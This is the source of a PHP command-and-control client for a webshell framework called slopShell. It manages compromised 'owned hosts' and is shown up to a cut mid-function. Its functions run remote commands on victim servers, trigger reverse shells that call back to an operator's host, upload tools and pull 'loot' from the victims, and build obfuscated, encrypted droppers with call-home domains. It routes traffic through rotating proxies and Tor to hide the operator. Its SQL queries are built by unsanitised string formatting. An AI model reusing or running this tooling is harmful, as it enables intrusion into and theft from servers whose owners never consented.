<?php
$proxy_set = null;
$proxy_target = null;
$proxy_schema = null;
define("CHH", curl_init());
if (strtolower(php_uname()) == "windows") {
    define('clears', 'cls');
} else {
    define('clears', "clear");
}
require "includes/db/postgres_checker.php";
require "includes/droppers/dynamic_generator.php";

$cof = array(
    "sloppy_db" => array(
        "host" => "127.0.0.1",
        "port" => "5432",
        "user" => get_current_user(),
        "password" => trim(readline("Password?Press enter for none->")),
        "dbname" => "sloppy_bots",
    ),
    "sloppy_http" => array(
        "useragent" => "sp1.1",
        "proxy" => trim(readline("Proxy?(schema://host:port) Press enter for none->")),
        "verify_ssl" => trim(readline("Verify SSL?(yes/no)->"))
    ),
    "sloppy_proxies" => array(
        "proxy_init"=>null,
        "use_proxies"=>null,
        "rotate"=>null,
        "use_tor"=>true

    )
);
const response_array = array(
    "default" => PHP_EOL . "\e[1;33m%s%s Hmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\e[0m" . PHP_EOL,
    "200" => PHP_EOL . "\e[0;32m%s%s is still ours!\e[0m" . PHP_EOL,
    "404" => PHP_EOL . "\e[0;31m%s%s Looks like our shell was caught... sorry..\e[0m" . PHP_EOL,
    "500" => PHP_EOL . "\e[1;31m%s%s Your useragent was not the correct one... did you forget??\e[0m" . PHP_EOL
);
is_file("includes/config/sloppy_config.ini") ? define("config", parse_ini_file('includes/config/sloppy_config.ini', true, 2)) : define("config", $cof);
$firstRun = new postgres_checker();
if (empty(config['sloppy_db']['pass'])) {
    $firstRun->createDB();
    define('DBCONN', sprintf("host=%s port=%s user=%s password=%s dbname=%s",
        config['sloppy_db']['host'],
        config['sloppy_db']['port'],
        config['sloppy_db']['user'],
        config['sloppy_db']['pass'],
        config['sloppy_db']['dbname']
    ));
} else {
    define('DBCONN', sprintf("host=%s port=%s user=%s password=%s dbname=%s",
        config['sloppy_db']['host'],
        config['sloppy_db']['port'],
        config['sloppy_db']['user'],
        config['sloppy_db']['pass'],
        config['sloppy_db']['dbname']
    ));
}

if (config['sloppy_proxies']['proxy_init'] !== true){
    $firstRun->getProxies('initial');
}else{
    echo "proxies built".PHP_EOL;
}



function grab_proxy(string $action, string $target_domain, bool $randomize){

    if ($action === "test" && !empty($target_domain)){
        $fetched = "SELECT proxy_schema,proxy from sloppy_bots_proxies WHERE last_domain_contacted NOT LIKE '%".$target_domain."%'";
        print(print_r(pg_fetch_all(pg_exec(pg_connect(DBCONN), $fetched))).PHP_EOL);
    }else{
        logo('proxied', clears, true, "The Required information was empty.".PHP_EOL, $target_domain);
    }
}
function logo($last, $cl, bool $error, $error_value, string $lastHost)
{
    if ($last === "q") {
        system($cl);
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
        echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
        echo("\033[33;40m ▄  ▀▀▀▀▄   █    █   █ █▀▀▀  █▀▀▀    ▀█       █   ▀  █    ██ ██▄▄    ██   █    █    \033[0m\n");
        echo("\033[33;40m  ▀▄▄▄▄▀    ███▄ ▀████ █     █       █        █▄  ▄▀ ███▄ ▐█ █▄   ▄▀ █ █  █   █     \033[0m\n");
        echo("\033[33;40m                ▀       █     █    ▄▀         ▀███▀      ▀ ▐ ▀███▀   █  █ █  ▀      \033[0m\n");
        echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m  Gr33tz: Notroot, J5                                                               \033[0m\n");
        echo("\033[33;40m  Git: https://github.com/oldkingcone/slopShell                                     \033[0m\n");
    } else if (is_null($last)) {
        system($cl);
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
        echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
        echo("\033[33;40m ▄  ▀▀▀▀▄   █    █   █ █▀▀▀  █▀▀▀    ▀█       █   ▀  █    ██ ██▄▄    ██   █    █    \033[0m\n");
        echo("\033[33;40m  ▀▄▄▄▄▀    ███▄ ▀████ █     █       █        █▄  ▄▀ ███▄ ▐█ █▄   ▄▀ █ █  █   █     \033[0m\n");
        echo("\033[33;40m                ▀       █     █    ▄▀         ▀███▀      ▀ ▐ ▀███▀   █  █ █  ▀      \033[0m\n");
        echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m  Gr33tz: Notroot, J5                                                               \033[0m\n");
        echo("\033[33;40m  Git: https://github.com/oldkingcone/slopShell                                     \033[0m\n");
        menu();
    } else {
        system($cl);
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
        echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
        echo("\033[33;40m ▄  ▀▀▀▀▄   █    █   █ █▀▀▀  █▀▀▀    ▀█       █   ▀  █    ██ ██▄▄    ██   █    █    \033[0m\n");
        echo("\033[33;40m  ▀▄▄▄▄▀    ███▄ ▀████ █     █       █        █▄  ▄▀ ███▄ ▐█ █▄   ▄▀ █ █  █   █     \033[0m\n");
        echo("\033[33;40m                ▀       █     █    ▄▀         ▀███▀      ▀ ▐ ▀███▀   █  █ █  ▀      \033[0m\n");
        echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
        echo("\033[33;40m                                                                                    \033[0m\n");
        echo("\033[33;40m  Last command: $last                                                               \033[0m\n");
        print(sprintf("\033[33;40m  Last Host -> %s", $lastHost) . "\033[0m\n");
        if ($error === true && !empty($error_value)) {
                echo("\033[1;37;44m  What was the error: {$error_value}                                  \033[0m".PHP_EOL);
        }
        menu();
    }

}

function menu()
{
    echo <<< _MENU
        \e[0;32m(O)ptions
        (R)eset proxy                                                                   
        (Sys)tem enumeration                                                        
        (Rev)erse shell                                                             
        (Com)mand Execution                                                         
        (CL)oner
        (CR)eate Dropper\e[0m                                                                                                                               
        \e[0;32m(A)dd new host                                                              
        (CH)eck if hosts are still pwned
        (AT) Add tool\e[0m
        \e[0;31;40m(UP)load tool to bot - currently not working, will be soon.\e[0m
        \e[0;32m(L)ist (T)ools
        \e[0;32m(G)rab (P)roxy\e[0m                                            
        (M)ain menu                                                                 
        (Q)uit\e[0m                                                                      
_MENU;
    echo "\n\n\033[0m\n";

}

function update_proxy_db_entries(string $proxy, bool $succssful, string $last_contact, bool $time_out, int $round_trip_time){
    if (!is_null($proxy) && !is_null($succssful) && !is_null($last_contact)) {
        $tg = pg_fetch_row(pg_exec(pg_connect(DBCONN),
            sprintf("SELECT times_used,time_outs,successful_responses FROM sloppy_bots_proxies WHERE proxy = '%s'", $proxy)));
        $tc = pg_exec(pg_connect(DBCONN),
            sprintf("UPDATE sloppy_bots_proxies SET times_used = '%s', last_domain_contacted = '%s', round_trip_time = '%s', time_outs = '%s', successful_responses = '%s'  WHERE proxy = '%s'",
                (int)$tg[0] + 1,
                $last_contact,
                $round_trip_time ? $round_trip_time : 0,
                $time_out ? (int)$tg[1] + 1 : (int)$tg[1] - 1,
                $succssful ? (int)$tg[2] + 1 : (int)$tg[2] - 1,
                $proxy
            ));
    }
}

function b64(array $what, $how, string $whereWeGo)
{
    // this function is currently causing the client to throw a 500 error.
    // will work though the issue and figure out a fix. but for now, this works... ish.
    curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
    curl_setopt(CHH, CURLOPT_POST, true);
    $our_nonce = openssl_random_pseudo_bytes(24);
    $secure_Key = openssl_random_pseudo_bytes(32);
    $additionalData = openssl_random_pseudo_bytes(16);
    $wheretoGo = pg_fetch_row(pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri,os_flavor FROM sloppy_bots_main WHERE id = %s", $whereWeGo)));
    curl_setopt(CHH, CURLOPT_URL, $wheretoGo[0].$wheretoGo[1]);
    if ($how === "u") {
        if ($what['Target'] === $wheretoGo[2] || $what['Target'] === "universal"){
            echo "\nTarget and victim OS match, should be good to go\n";
        }elseif ($what['Target'] === "unk"){
            echo "\nTarget of our tool is UNK, I hope you did your research on the target before selecting this.\n";
        }
        if (is_file($what['Base64_Encoded_Tool'])){
            $what["read"] = file_get_contents($what['Base64_Encoded_Tool']);
            $tool = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt(base64_encode(serialize($what)), $additionalData, $our_nonce, $secure_Key);
        }else{
            $tool = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt(base64_encode(serialize($what)), $additionalData, $our_nonce, $secure_Key);
        }
        $needed_values = base64_encode($tool);
        $basedHashUpload = base64_encode($additionalData.".".$our_nonce.".".$secure_Key.".".$needed_values);
        curl_setopt(CHH, CURLOPT_COOKIE, "cb64=U.".hash("sha512", $basedHashUpload, $binary=false)."; jsessionid=". $basedHashUpload);
    }elseif ($how === "D"){
        $tool = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt(base64_encode(serialize($what)), $additionalData, $our_nonce, $secure_Key);
        $baseHashedDownload = base64_encode($additionalData.".".$our_nonce.".".$secure_Key.".".$tool);
        curl_setopt(CHH, CURLOPT_COOKIE, "cb64=D.".hash("sha512", $baseHashedDownload, $binary=false)."; jsessionid=". $baseHashedDownload);
    }
    $dx = curl_exec(CHH);
    if (!curl_errno(CHH)) {
        switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
            case 200:
                logo('co', clears, false, '', '');
                //TODO need to fix this, and why its dumping the ENTIRE response object over the base64 encoded value. once this is done, will add a routine to plop it right into the db
                //depending on size, placing larger files on disk rather than db.
                file_put_contents("includes/db/retrieved_loot/".curl_getinfo(CHH, CURLINFO_FILETIME), $dx, FILE_APPEND);
                echo $dx."\n";
                break;
            default:
                logo('b64', clears, true, "Appears our shell was caught, or the reported URI was wrong.\nPlease Manually confirm.\n", '');
        }

    }

}


function sloppyTools(string $action, $pathToFile, $toolName, bool $encrypted)
{
    $c = pg_connect(DBCONN);
    if ($action === "add") {
        if (!empty($pathToFile) && is_file($pathToFile) && !empty($toolName)) {
            $file_parts = pathinfo($pathToFile);
            switch ($file_parts['extension']) {
                case "cpp":
                    echo "C++ Source detected.\nMake sure you compile when you upload.\n";
                    $toolTarget = readline("[ >> ] What OS is this for? [ << ] ->");
                    $language = "cplusplus";
                    break;
                case "c++":
                    echo "C++ Source detected.\nMake sure you compile when you upload.\n";
                    $toolTarget = readline("[ >> ] What OS is this for? [ << ] ->");
                    $language = "cplusplus";
                    break;
                case "c":
                    echo "C Source detected.\nMake sure you compile when you upload.\n";
                    $toolTarget = readline("[ >> ] What OS is this for? [ << ] ->");
                    $language = "c";
                    break;
                case "sh":
                    echo "Shell script detected.\n";
                    $toolTarget = 'lin';
                    $language = 'bash';
                    break;
                case "ps1":
                    echo "Powershell script detected.\n";
                    $toolTarget = 'win';
                    $language = 'powershell';
                    break;
                case "py":
                    echo "Python script detected.\n";
                    $toolTarget = "universal";
                    $language = "python";
                    break;
                case "php":
                    echo "PHP script detected.\n";
                    $toolTarget = "universal";
                    $language = "php";
                    break;
                case "exe":
                    echo "Binary file detected.\n";
                    $toolTarget = 'win';
                    $language = 'executable';
                    break;
                case "dll":
                    echo "DLL(Dynamically linked library) detected.\n";
                    $toolTarget = 'win';
                    $language = 'unk';
                    break;
                case "so":
                    echo "Shared Object detected.\n";
                    $toolTarget = 'linux';
                    $language = 'unk';
                    break;
                case "lib":
                    echo "Library detected.\n";
                    $toolTarget = 'linux';
                    $language = 'unk';
                    break;
                case "bat":
                    echo "Batch script detected.\n";
                    $toolTarget = 'win';
                    $language = 'batch';
                    break;
                case "vbs":
                    echo "Visual Basic script detected.\n";
                    $toolTarget = 'win';
                    $language = 'vbs';
                    break;
            }
            if ($encrypted === true) {
                $algos = array(
                    "chacha" => "chacha20-poly1305",
                    "xchacha" => "xchacha20-poly1305",
                    "aes-gcm" => "aes-265-gcm",
                    "aes-ctr" => "aes-256-ctr"
                );
                $algo = "aes-256-gcm";
                $passphrase = openssl_random_pseudo_bytes(32);
                $passphraseHmacTagValue = openssl_random_pseudo_bytes(128);
                $Oaad=hash_hmac('sha256', $passphraseHmacTagValue, $binary=true);
                $IV = openssl_random_pseudo_bytes((int)openssl_cipher_iv_length($algo));
                if (strlen(file_get_contents($pathToFile)) > 8191){
                    echo "Storing as an encoded file on disk. The tool size exceeds the maximum size in a postgresql cell.\n";
                    $ciphered = 'includes/droppers/large_tools/' . $toolName . ".b64";
                    if (!is_file('includes/droppers/large_tools/'.$toolName.".b64")) {
                        $crypted = openssl_encrypt(file_get_contents($pathToFile), $algo, $passphrase, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING, $IV, $passphraseHmacTagValue, $tag_length=16, $aad=$Oaad);
                        file_put_contents('includes/droppers/large_tools/' . $toolName . ".b64", base64_encode($crypted));
                    }else{
                        echo "\n!!! You have already added this tool !!!\n";
                        return $ciphered;
                    }
                }else{
                    $crypted = openssl_encrypt(file_get_contents($pathToFile), $algo, $passphrase, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING, $IV, $passphraseHmacTagValue, strlen($passphraseHmacTagValue));
                    $ciphered =  base64_encode($crypted);
                }
                if (empty($toolTarget)) {
                    $toolTarget = "unk";
                    $language = "unk";
                }
                $SQL_STMT = sprintf("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, keys, tags, iv, aad, cipher, hmac_hash, lang, encrypted) VALUES('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')",
                    $toolName,
                    $toolTarget,
                    $ciphered,
                    base64_encode($passphrase),
                    base64_encode($passphraseHmacTagValue),
                    base64_encode($IV),
                    base64_encode($Oaad),
                    $algo,
                    hash_hmac("sha512", $crypted, $binary = true),
                    $language,
                    true
                );
            } else {
                $SQL_STMT = sprintf("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, lang, hmac_hash) VALUES('%s', '%s', '%s', '%s', '%s')",
                    $toolName,
                    $toolTarget,
                    base64_encode(file_get_contents($pathToFile)),
                    $language,
                    hash_hmac("sha512", file_get_contents($pathToFile), $binary = true)
                );
            }
            pg_exec($c, $SQL_STMT);
        }
    } elseif ($action === "grab") {
        $tgrab = pg_exec($c, "SELECT * FROM sloppy_bots_tools");
        echo "\n";
        echo str_repeat("<", 35) . "[ OUR TOOLSETS ]" . str_repeat(">", 39) . "\n\n";
        foreach (pg_fetch_all($tgrab) as $ti => $tool) {
            if ($tool['encrypted'] == "t") {
                $isEncrypted = "true";
            } else {
                $isEncrypted = "false";
            }
            print(sprintf("ID -> [ " . $tool['id'] . " ] Tool Name-> [ " . $tool['tool_name'] . " ] Target OS -> [ " . $tool['target'] . " ] Lang -> [ " . $tool['lang'] . " ] Encrypted -> [ " . $isEncrypted . " ]\n"));
        }
        echo "\n\n" . str_repeat("<", 35) . "[ END OUR TOOLSETS ]" . str_repeat(">", 35) . "\n\n";
        $SQL_GRAB = sprintf("SELECT base64_encoded_tool,keys,tags,iv,cipher,hmac_hash,encrypted,target,aad FROM sloppy_bots_tools WHERE id = '%s'", trim(readline('Which tool shall we use?(by ID)-> ')));
        try {
            $selected_tool = pg_fetch_row(pg_exec($c, $SQL_GRAB));
            $attack = array([
                "Base64_Encoded_Tool" => $selected_tool[0],
                "Key" => $selected_tool[1],
                "Tag" => $selected_tool[2],
                "IV" => $selected_tool[3],
                "Cipher" => $selected_tool[4],
                "Hash" => $selected_tool[5],
                "Encrypted" => $selected_tool[6],
                "Target" => $selected_tool[7],
                "aad" => $selected_tool[8]
            ],
            );
            print(print_r($attack).PHP_EOL);
        } catch (Exception $toolE) {
            echo $toolE->getMessage() . "\n";
            echo $toolE->getTraceAsString() . "\n";
            echo $toolE->getLine() . "\n";
            return 0;
        }
        awesomeMenu('');
        $HOST_GRAB = sprintf("SELECT rhost,uri,os_flavor FROM sloppy_bots_main WHERE id = %d", trim(readline("Which host shall we send this tool to?->")));
        $X = pg_fetch_row(pg_exec($c, $HOST_GRAB));
        array_push($attack, [
            "Rhost" => $X[0],
            "uri" => $X[1],
            "Os_Flavor" => $X[2]
        ]);
        b64($attack[0], 'u', $attack[1]);
    }
}

function opts(bool $proxy_set)
{
    system(clears);
    $ppg = pg_connect(DBCONN);
    print("\n\nCurrent options enabled:\n\n");
    print(print_r(config)."\n");
    print("\n\n" . str_repeat("-", 35) . "\n");
    print("\n\nCurrent DB Status:\n\n");
    if ($ppg == PGSQL_CONNECTION_OK or $ppg == PGSQL_CONNECTION_AUTH_OK) {
        print("\nConnected!\n\n");
        print("\nPG Host: " . pg_host($ppg));
        print("\nPG Port: " . pg_port($ppg));
        print("\nPG Ping? " . pg_ping($ppg));
    } else {
        print("Could not connect... ensure the DB is running and we are allowed to connect to it.");
    }
    print("\n\n" . str_repeat("-", 35) . "\n");
    curl_setopt(CHH, CURLOPT_HEADER, 0);
    curl_setopt(CHH, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt(CHH, CURLOPT_URL, "https://icanhazip.com");
    if ($proxy_set === true){
        echo "\e[0;32;40m[ ** ] Good job, proxy has been set. Please wait, checking what our IP address is. [ ** ]\e[0m".PHP_EOL;
    }else{
        echo "\e[0;31;40m[ !! ] No proxy has been set... [ !! ]\e[0m".PHP_EOL;
    }
    echo "[ ++ ] Our IP Address is: ".trim(curl_exec(CHH))." [ ++ ]".PHP_EOL;
    curl_reset(CHH);
    echo PHP_EOL;
}

function sys($host)
{
    if (!empty($host)) {
        $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
        $axX = pg_fetch_row($tc);
        curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1] . "?qs=cqBS");
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
        $syst = curl_exec(CHH);
        if (!curl_errno(CHH)) {
            switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                case 200:
                    logo('enumerate system', clears, false, '', $axX[0]);
                    echo $syst.PHP_EOL;
                    break;
                default:
                    logo('s', clears, true, "Resulted in a non response... ensure the server is still up or your connection is still good.", $axX[0].$axX[1]);
                    print(sprintf(response_array['default'], $axX[0],$axX[1]));
            }

        }else{
            logo('s', clears, true, "Resulted in a non response... ensure the server is still up or your connection is still good.", $axX[0].$axX[1]);
        }
    } else {
        logo('s', clears, true, "Host and/or URI was empty, please double check.", $host);
    }
    return 0;
}

function rev($host, $port, $method, $callhome)
{
    $usePort = null;
    $Ushell = null;
    if (isset($host)) {
        $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri,os_flavor FROM sloppy_bots_main WHERE id = '%s'", $host));
        $axX = pg_fetch_row($tc);
        if (empty($port)) {
            $usePort = "1634";
        } else {
            $usePort = $port;
        }
        if (empty($method)) {
            $useMethod = "bash";
        } else {
            $useMethod = $method;
        }
        if (empty($useShell) && $axX[2] == "lin") {
            $useShell = "bash";
        } else {
            $useShell = "cmd";
        }
        if (!empty($callhome)){
            $callbackhome = $callhome;
        }else{
            $callbackhome = '';
        }
        echo "[ ++ ] Trying: " . $axX[0] . " on " . $usePort . "[ ++ ]\n";
        $revCommand = base64_encode($useMethod . "." . $usePort . "." . $useShell. ".". $callbackhome);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
        curl_setopt(CHH, CURLOPT_POST, true);
        curl_setopt(CHH, CURLOPT_COOKIE, "jsessionid={$revCommand}");
        curl_setopt(CHH, CURLOPT_POSTFIELDS, "");
        $syst = curl_exec(CHH);
        if (!curl_errno(CHH)) {
            switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                case 200:
                    logo('co', clears, false, '', $axX[0].$axX[1]);
                    echo $syst;
                    break;
                default:
                    logo('co',clears,true, 'Reverse Connection Failed double check handler.', $axX[0].$axX[1]);
                    print(sprintf(response_array['default'], $axX[0],$axX[1]));
            }

        }else{
            logo('s', clears, true, "Resulted in a non response... ensure the server is still up or your connection is still good.", $axX[0].$axX[1]);
        }
    } else {
        logo('reverse', clears, true, '', $host);
    }

}

function co($command, $host, bool $encrypt)
{
    if ($encrypt === true && !is_null($command)) {
        $our_nonce = openssl_random_pseudo_bytes(24);
        $secure_Key = openssl_random_pseudo_bytes(32);
        $additionalData = openssl_random_pseudo_bytes(16);
        try {
            $un = base64_encode(serialize($command));
            $ct = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt($un, $additionalData, $our_nonce, $secure_Key);
            $cr = "2";
            $space_Safe_coms = base64_encode(bin2hex($our_nonce) . "." . bin2hex($secure_Key) . "." . bin2hex($additionalData) . "." . bin2hex($ct));
        } catch (SodiumException $exception) {
            echo $exception->getMessage();
            echo $exception->getTraceAsString();
            echo $exception->getLine();
            return 0;
        }
    } else {
        $cr = "1";
        $space_Safe_coms = base64_encode(serialize(base64_encode($command)));
    }
    if (!empty($host) && !is_null($space_Safe_coms) && !is_null($cr)) {
        $tcO = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
        $axX = pg_fetch_row($tcO);
        curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1]);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
        curl_setopt(CHH, CURLOPT_POST, true);
        curl_setopt(CHH, CURLOPT_COOKIE, "jsessionid={$space_Safe_coms}");
        curl_setopt(CHH, CURLOPT_POSTFIELDS, "cr={$cr}");
        $syst = curl_exec(CHH);
        if (!curl_errno(CHH)) {
            switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
                case 200:
                    logo('co', clears, false, '', sprintf('%s%s -> %s', $axX[0],$axX[1], $command));
                    echo $syst;
                    break;
                default:
                    logo('co',clears,true, '', sprintf('%s%s', $axX[0],$axX[1]));
                    print(sprintf(response_array['default'], $axX[0],$axX[1]));
            }

        }else{
            logo('co', clears, true, "{$command} Resulted in a non response... ensure the server is still up or your connection is still good.", $axX[0] . $axX[1]);
        }
    } else {
        logo('co', clears, true, "Something went wrong.", '');
    }
    return 0;
}

function clo($host, $repo, $uri)
{
    menu();
    if (!empty($host) && !empty($repo) && !empty($uri)) {
        $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
        $axX = pg_fetch_row($tc);
        curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1]);
        curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
        curl_setopt(CHH, CURLOPT_POST, true);
        curl_setopt(CHH, CURLOPT_POSTFIELDS, "clone=$repo");
        $re = curl_exec(CHH);
        $http_code = curl_getinfo(CHH, CURLINFO_HTTP_CODE);
        if (!curl_errno(CHH)) {
            switch ($http_code) {
                case 200:
                    logo('co',clears,false, '', sprintf('%s%s', $axX[0],$axX[1]));
                    return $re;
                default:
                    logo('co',clears,true, 'Clone Failed.', sprintf('%s%s', $axX[0],$axX[1]));
                    print(sprintf(response_array['default'], $axX[0],$axX[1]));
            }
        } else {
            $errors = array(
                "Host" => $host,
                "Repo" => $repo,
                "Target URI" => $uri,
                "Curl Error" => $http_code
            );
            logo('cloner', clears, true, $errors, $host);
        }
        curl_close(CHH);
    } else {
        $errors = array(
            "Host" => $host,
            "Repo" => $repo,
            "Target URI" => $uri
        );
        logo('cloner', clears, true, $errors, $host);
    }

}

function createDropper($callHome, $callhomePort, $duration, $obfsucate, $depth)
{
    echo "Starting dropper creation\n";
    $file_in = "includes/base.php";
    $slop = getcwd() . "/slop.php";
    $t = new dynamic_generator();
    $inDB = new postgres_checker();
    if (!empty($callHome) && !empty($duration) && !empty($depth) && !empty($obfsucate)) {
        try {
            switch ($obfsucate) {
                case "y":
                    $ob = "includes/droppers/dynamic/obfuscated/" . bin2hex(random_bytes(rand(5, 25))) . ".php";
                    if ((int)$depth > 23) {
                        print("Depth needs to be 23 or lower, too much depth causes the script obfuscation to be redundant.\n Since you want a higher depth, going to encrypt the payload/shell.\n");
                        $encrypt = true;
                        $depth = 23;
                    } else {
                        print("Trying randomness with {$depth}\n");
                        $encrypt = false;
                    }
                    print("Generated dropper will be: {$ob}\n");
                    $rtValues = $t->begin_junk($file_in, $depth, $ob, "ob", $encrypt, $callHome, $callhomePort, $duration, $slop);
                    pg_exec(pg_connect(DBCONN), sprintf("INSERT INTO sloppy_bots_droppers(location_on_disk, depth, obfuscated, check_in, aeskeys, chachakey, xorkey, checkindomain, checkinport, cookiename, cookievalue) VALUES ('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')",
                        $rtValues['Output File'],
                        $depth,
                        $obfsucate,
                        $duration,
                        $rtValues['Key'] . "." . $rtValues['IV'] . "." . $rtValues['tag'],
                        '',
                        $rtValues['XOR Key'],
                        $rtValues['CheckinDomain'],
                        $rtValues['CheckinPort'],
                        $rtValues['Cookie'],
                        $rtValues['Cookie Value']));
                    $inDB->countUsedDomains($callHome);
                    system("ls -lah includes/droppers/dynamic/obfuscated");
                    print("\n\nPress M to return to the menu.\n");
                    break;
                case "n":
                    menu();
                    $n = "includes/droppers/dynamic/raw/" . bin2hex(random_bytes(rand(5, 25))) . ".php";
                    print("Generated Dropper will be: {$n}\n");
                    $rtValues = $t->begin_junk($file_in, 0, $n, "n", false, $callHome, $callhomePort, 1000, $slop);
                    system("ls -lah includes/droppers/dynamic/raw");
                    break;
            }

        } catch (Exception $exception) {
            $empty = array(
                "Callhome" => $callHome,
                "Duration" => $duration,
                "Obfuscate" => $obfsucate,
                "Depth" => $depth,
                "Actual Exception" => $exception
            );
            logo('cr', clears, true, $empty, '');
        }

    } else {
        $empty = array(
            "Callhome" => $callHome,
            "Duration" => $duration,
            "Obfuscate" => $obfsucate,
            "Depth" => $depth
        );
        logo('cr', clears, true, $empty, '');
    }
}

function aHo($host, $os, $checkIn)
{
    $t = new postgres_checker();
    if (!empty($host)) {
        $path = parse_url($host);
        if ($t->insertRecord($path['scheme'] . "://" . $path['host'] . ":" . $path['port'], $path['path'], $os, $checkIn, $uuid = '', $action = 'add') != 0) {
            if (strpos($path['path'], 'txt'))
            {
                logo('co',clears,true, 'Extension cannot end in anything other than php, as this is a php webshell.', sprintf('%s', $path['host'].$path['port'].":".$path['path']));
            }
            logo('co',clears,false, '', sprintf('%s', $path['host'].$path['port'].":".$path['path']));
            echo "\n\nSuccessfully added: $host";
        } else {
            if (!$t->checkDB()) {
                logo('co',clears,true, 'No Database?', sprintf('%s', $host));
                echo "\n\nThere is a sevre error in the db, you need to ensure you have it crated.";
                echo "\nAttempting to re-create or create the DB.";
                $t->createDB();
            } else {
                logo('co',clears,true, 'Duplicate Host', sprintf('%s', $host));
                echo "\n\nSeems as though the information supplied, was bad..\nOr the host already is in the DB.";
                $t->getRecord($host);
            }
        }
    } else {
        logo('add host', clears, true, $host, $host);
    }
}

function awesomeMenu(string $what)
{
    // this is quite messy, but will be refined later. its just in here for now.
    system(clears);
    switch ($what){
        case "hosts":
            $axx = pg_exec(pg_connect(DBCONN), "SELECT * FROM sloppy_bots_main");
            $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
            echo str_repeat("+", 35) . "[ OWNED HOSTS ]" . str_repeat("+", 35) . "\n\n";
            foreach (pg_fetch_all($axx) as $tem => $use) {
                print(sprintf("[ ID: ]-> %s [ RHOST: ]-> %s [ URI: ]-> %s [ OS_FLAVOR: ]-> %s [ CHECKED_IN: ]-> %s\n",
                    $use['id'],
                    $use['rhost'],
                    $use['uri'],
                    $use['os_flavor'],
                    $use['check_in']
                ));
            }
            pg_free_result($count);
            pg_free_result($axx);
            echo "\n\n" . str_repeat("+", 35) . "[ END OWNED HOSTS ]" . str_repeat("+", 35) . "\n\n";
            break;
        case "proxies":
            $count_array = array(
                "socks4" => "SELECT COUNT(*) FROM (SELECT proxy from sloppy_bots_proxies WHERE proxy_schema = 'socks4') AS TEMP",
                "http" => "SELECT COUNT(*) FROM (SELECT proxy from sloppy_bots_proxies WHERE proxy_schema = 'http') AS TEMP",
                "https" => "SELECT COUNT(*) FROM (SELECT proxy from sloppy_bots_proxies WHERE proxy_schema = 'https') AS TEMP",
                "socks5" => "SELECT COUNT(*) FROM (SELECT proxy from sloppy_bots_proxies WHERE proxy_schema = 'socks5') AS TEMP"
            );
            $schema = trim(readline('[ !! ] Which schema?(socks4/socks5/http)->'));
            if (!empty($schema)){
                $schema_to_use = sprintf("SELECT * FROM sloppy_bots_proxies WHERE proxy_schema = '%s' ORDER BY times_used DESC LIMIT %s", $schema, trim(readline("Limit(there are a ton in the db.)?")));
                $count = pg_exec(pg_connect(DBCONN), $count_array[$schema]);
                $final = pg_fetch_row($count);
                print(sprintf("There are currently: %s number of proxies under the %s schema in the database".PHP_EOL, $final[0] , $schema));
            }else{
                echo "Schema was empty, defaulting to socks4, with a limit of 10";
                $schema_to_use = "SELECT * FROM sloppy_bots_proxies WHERE proxy_schema = 'socks4' LIMIT 10";
            }
